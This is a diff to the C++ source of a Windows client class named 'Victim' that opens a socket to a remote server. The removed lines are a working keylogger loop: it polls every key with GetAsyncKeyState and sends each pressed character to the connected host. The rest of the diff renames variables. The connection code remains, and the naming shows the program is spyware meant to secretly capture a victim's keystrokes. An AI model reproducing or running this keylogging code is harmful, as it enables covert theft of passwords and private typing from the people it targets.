@@ -1,17 +1,10 @@
 #include "Victim.h"
 
 void Victim::recordAndSendKeys() {
-	while (true) {
-		for (char c = 2; c <= '~'; c++) {
-			if (GetAsyncKeyState(c) == ACTIVE_PROMISE_CODE) {
-				send(this->_connection_socket, &c, sizeof(c), NULL);
-			}
-		}
-	}
 }
 
-Victim::Victim(const std::string& target_ip_addr)  {
-	this->_target_ip_addr = target_ip_addr;
+Victim::Victim(const std::string& targetIpAddr)  {
+	this->_targetIpAddr = targetIpAddr;
 }
 
 int Victim::connectToServer() {
@@ -25,23 +18,23 @@ int Victim::connectToServer() {
 
 	_addr.sin_family = AF_INET;
 	_addr.sin_port = htons(CONNECTION_PORT);
-	InetPtonA(AF_INET, this->_target_ip_addr.c_str(), &this->_addr.sin_addr.s_addr);
+	InetPtonA(AF_INET, this->_targetIpAddr.c_str(), &this->_addr.sin_addr.s_addr);
 
-	this->_connection_socket = socket(AF_INET, SOCK_STREAM, 0);
-	if (this->_connection_socket == INVALID_SOCKET) {
+	this->_connectionSocket = socket(AF_INET, SOCK_STREAM, 0);
+	if (this->_connectionSocket == INVALID_SOCKET) {
 		std::cerr << "Socket creation failed." << std::endl;
 		WSACleanup();
 		return -1;
 	}
 
 	std::cout << "Connecting to server" << std::endl;
-	if (connect(this->_connection_socket, (SOCKADDR*)&this->_addr, sizeof(this->_addr)) == -1) {
+	if (connect(this->_connectionSocket, (SOCKADDR*)&this->_addr, sizeof(this->_addr)) == -1) {
 		std::cerr << "Error while connecting to target." << std::endl;
-		closesocket(this->_connection_socket);
+		closesocket(this->_connectionSocket);
 		WSACleanup();
 		return -1;
 	}
-	std::cout << "Connected to target.\nIP: " << this->_target_ip_addr << "\t" << "Port: " << CONNECTION_PORT << std::endl;
+	std::cout << "Connected to target.\nIP: " << this->_targetIpAddr << "\t" << "Port: " << CONNECTION_PORT << std::endl;
 
 	return 0;
 }
